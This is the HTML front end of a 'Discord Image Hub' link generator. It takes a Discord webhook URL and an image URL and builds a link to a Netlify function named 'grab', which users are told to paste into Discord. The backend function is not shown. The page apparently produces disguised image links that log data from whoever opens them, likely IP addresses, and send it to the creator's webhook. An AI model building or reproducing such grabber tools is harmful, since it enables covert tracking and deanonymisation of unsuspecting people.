<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Image Hub</title>
    <style>
        :root { --discord-blurple: #5865F2; --dark-bg: #23272A; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--dark-bg); color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 100%; max-width: 450px; background: #2C2F33; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        h2 { text-align: center; margin-bottom: 20px; color: #fff; }
        label { display: block; margin-bottom: 5px; font-size: 0.9rem; color: #b9bbbe; }
        input { width: 100%; padding: 12px; margin-bottom: 20px; border-radius: 5px; border: none; background: #202225; color: white; box-sizing: border-box; }
        button { width: 100%; padding: 14px; background: var(--discord-blurple); color: white; border: none; cursor: pointer; font-weight: bold; border-radius: 5px; transition: 0.2s; }
        button:hover { background: #4752c4; }
        #outputLink { margin-top: 25px; background: #1e2124; padding: 15px; display: none; border-radius: 5px; border-left: 5px solid var(--discord-blurple); }
        code { display: block; word-break: break-all; color: #00b0f4; margin: 10px 0; font-family: monospace; }
        .copy-hint { font-size: 0.8rem; color: #72767d; }
    </style>
</head>
<body>

<div class="box">
    <h2>🚀 Link Generator</h2>
    
    <label>Discord Webhook URL</label>
    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">

    <label>Image URL (Direct Link)</label>
    <input type="url" id="imgUrl" placeholder="https://i.imgur.com/example.png">

    <button onclick="generateLink()">Generate Embed Link</button>

    <div id="outputLink">
        <span class="copy-hint">Copy and paste this into Discord:</span>
        <code id="finalUrl"></code>
    </div>
</div>

<script>
    function generateLink() {
        const webhook = document.getElementById('webhook').value;
        const img = document.getElementById('imgUrl').value;
        const output = document.getElementById('outputLink');
        const finalUrl = document.getElementById('finalUrl');

        if (!webhook.includes('discord.com/api/webhooks') || !img) {
            alert("Please provide a valid Webhook and Image URL.");
            return;
        }

        // Extract ID and Token from the webhook URL
        const parts = webhook.split('/api/webhooks/')[1];

        // This points directly to the Netlify Function
        const baseUrl = window.location.origin;
        const generated = `${baseUrl}/.netlify/functions/grab?id=${parts}&img=${encodeURIComponent(img)}`;

        finalUrl.innerText = generated;
        output.style.display = 'block';
    }
</script>

</body>
</html>
